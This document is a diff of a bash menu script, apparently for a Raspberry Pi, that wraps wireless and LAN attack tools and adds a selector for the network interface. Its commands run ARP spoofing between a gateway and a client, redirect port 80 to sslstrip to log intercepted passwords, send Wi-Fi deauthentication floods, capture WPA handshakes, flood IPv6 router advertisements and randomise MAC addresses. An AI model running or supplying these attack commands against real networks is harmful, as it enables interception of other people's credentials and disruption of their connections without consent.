@@ -3,6 +3,19 @@
 #Remeber to cahnge all interfaces to match your own. on the raspberry pi will most likely be wlan0
 clear
 exit=0
+available_interface=()
+current_interface="wlan0"
+primary_interface() {
+	count=0
+	for i in $( ls /proc/net/dev_snmp6/ )
+	do
+		available_interface[$count]="$i"
+		available_interface[$(( $count+1 ))]="Select"
+		count=$(( count+2 ))
+	done
+	current_interface=$( whiptail --menu "Select your interface:" 25 50 7 \
+			"${available_interface[@]}" 3>&2 2>&1 1>&3- )
+}
 
 monitor_cleanup(){
 	for i in $( airmon-ng | grep "mon" | awk '{print $1}' )
@@ -19,14 +32,18 @@ auto_map(){
 	for i in $( nmap -v -sn $(ipcalc $(ifconfig | grep "Bcast" | awk -F':' '{print $2}' | awk -F' ' '{print $1}') | grep "Network" | awk -F' ' '{print $2}')| grep -v "host down" | grep "Nmap scan report" | awk '{print $5}' )
 	do
 		targetIPs[$count]="$i"
-		targetIPs[$(( count+1 ))]=" "
 		count=$(( $count + 2 ))
 	done
+	count=1
+	for i in $( nmap -v -sn $(ipcalc $(ifconfig | grep "Bcast" | awk -F':' '{print $2}' | awk -F' ' '{print $1}') | grep "Network" | awk -F' ' '{print $2}')| grep -v "host down" | grep "MAC" | awk '{print $3 $4}' | sed -e 's/ /_/g' )
+	do 
+		targetIPs[$count]="$i"
+		count=$(( $count+2 ))
+	done
 	#3>&2 2&1 1>&3- is needed to make the whiptail UI appear.
-	CURRENT_TARGET=$( whiptail --menu "Select a target host:" 20 80 10 \
-		"${targetIPs[@]}" 3>&2 2>&1 1>&3- )
-	CURRENT_TARGET2=$( whiptail --menu "Select a target client:" 20 80 10 \
-		"${targetIPs[@]}" 3>&2 2>&1 1>&3- )
+	CURRENT_TARGET=$(route -n | awk -F' ' '{print $2}' | grep -v -E "Gateway|IP|0.0.0.0")
+	CURRENT_TARGET2=$( whiptail --menu "Select a target client:" 25 50 7 \
+			"${targetIPs[@]}" 3>&2 2>&1 1>&3- )
 }
 
 AVAILABLEAP=()
@@ -34,19 +51,19 @@ TARGETAP=""
 
 Nearby_Mac(){
 	AvailableAP=()
-	TARGETAP="AA:BB:CC:DD:EE:FF"
-	for i in $( iwlist wlan2 scan | grep 'Address' | awk -F' ' '{print $5}' )
+	count=0
+	for i in $( iwlist $current_interface scan | grep 'Address' | awk -F' ' '{print $5}' )
 	do
 		AvailableAP[$count]="$i"
 		count=$(( $count + 2 ))
 	done
 	count=1
-	for i in $( iwlist wlan2 scan | grep 'ESSID' | awk -F':' '{print $2}' | sed -e 's/ /_/g' )
+	for i in $( iwlist $current_interface scan | grep 'ESSID' | awk -F':' '{print $2}' | sed -e 's/ /_/g' )
 	do
 		AvailableAP[$count]="$i"
 		count=$(( $count + 2 ))
 	done
-	TARGETAP=$( whiptail --menu "Select a target host:" 20 80 10 \
+	TARGETAP=$( whiptail --menu "Select a target host:" 25 50 7 \
 			"${AvailableAP[@]}" 3>&2 2>&1 1>&3- )
 }
 
@@ -64,6 +81,7 @@ while [ exit != 2 ]; do
 	
 	#Main Menu
 	whiptail --menu "Main Menu" 25 50 7 \
+		select_interface "Select the interface you want to use to hax things"\
 		macchange "MAC Changer" \
 		clean_mon "Cleans up monitor mode if not cleaned up properly"\
 		airodump "Airodump-ng + Airmon-ng" \
@@ -84,24 +102,24 @@ while [ exit != 2 ]; do
 	
 	case $CHOICE in
 	
+	select_interface) primary_interface
+	;;
+
 	#turns off interfaces.
 	#Sets interfaces to random Macaddr
 	#brings interfaces back up
-	macchange) ifconfig eth0 down
-		ifconfig wlan0 down
-		macchanger -r eth0
-		macchanger -r wlan0
-		ifconfig eth0 up
-		ifconfig wlan0 up
+	macchange) ifconfig $current_interface down
+		macchanger -r $current_interface
+		ifconfig $current_interface up
 	;;
 	#check to see what monitor modes are up and then stops them.
 	clean_mon) echo "checking for monitor interfaces"
 		echo "removing all monitor interfaces"
 		monitor_cleanup
 	;;
-	#Starts monitor mode using wlan0 interface
+	#Starts monitor mode using choosen interface
 	#starts running airodump
-	airodump) airmon-ng start wlan0
+	airodump) airmon-ng start $current_interface
 		airodump-ng mon0
 		monitor_cleanup
 	;;
@@ -109,7 +127,7 @@ while [ exit != 2 ]; do
 	##Airodump a specific AP must make skider
 	airodump2) whiptail --inputbox "Please enter access point bssid:" 25 50 2>AIRODUMPBSSID 
 		AIRODUMPBSSID=$(cat AIRODUMPBSSID)
-		airmon-ng start wlan2
+		airmon-ng start $current_interface
 		airodump-ng --bssid $AIRODUMPBSSID mon0
 		monitor_cleanup
 	;;
@@ -148,13 +166,13 @@ while [ exit != 2 ]; do
 		auto_map
 		
 		#Enables ip-forwarding
-		echo 1 > /proc/sys/net/ipv4/ip_forwardreding
+		echo 1 > /proc/sys/net/ipv4/ip_forward
 		#opens up NAT and redirects trafiic from port 80 to port 8080 within the machine
 		iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080
 		
 		#launches arpspoof impersonating the host and the client
-		xterm -e arpspoof -i wlan0 -t $ARPSPOOFHOST $ARPSPOOFCLIENT &
-		xterm -e arpspoof -i wlan0 -t $ARPSPOOFCLIENT $ARPSPOOFHOST &
+		xterm -e arpspoof -i $current_interface -t $ARPSPOOFHOST $ARPSPOOFCLIENT &
+		xterm -e arpspoof -i $current_interface -t $ARPSPOOFCLIENT $ARPSPOOFHOST &
 		
 		#launches sslstrip Passwords will be displayed on screen and logged in sslstrip.log (may wish to add some kind of time stamping in the name... Oh well)
 		sslstrip -k -l 8080 -w /root/Desktop/sslstrip.log 
@@ -168,7 +186,7 @@ while [ exit != 2 ]; do
 	ettercap) ettercap -G
 	;;
 	#New favorite -Jack
-	deauth)airmon-ng start wlan2
+	deauth)airmon-ng start $current_interface
 		echo "discovering nearby APs"
 		Nearby_Mac
 		echo "launching attack"
@@ -176,12 +194,12 @@ while [ exit != 2 ]; do
 		monitor_cleanup
 	;;
 	arp-cop)echo "press 'q' to quit"
-		ettercap -T -i wlan2 -P arp_cop
+		ettercap -T -i $current_interface -P arp_cop
 	;;
 	#needs a better way to exit may cause end of program
-	ipv6-flood) flood_advertise6 wlan2
+	ipv6-flood) flood_advertise6 $current_interface
 	;;
-	pcap_capture) airmon-ng start wlan2
+	pcap_capture) airmon-ng start $current_interface
 			Nearby_Mac
 			xterm -e aireplay-ng -0 10 -a $TARGETAP mon0 --ignore-negative-one &
 			airodump-ng --bssid $TARGETAP -w psk mon0
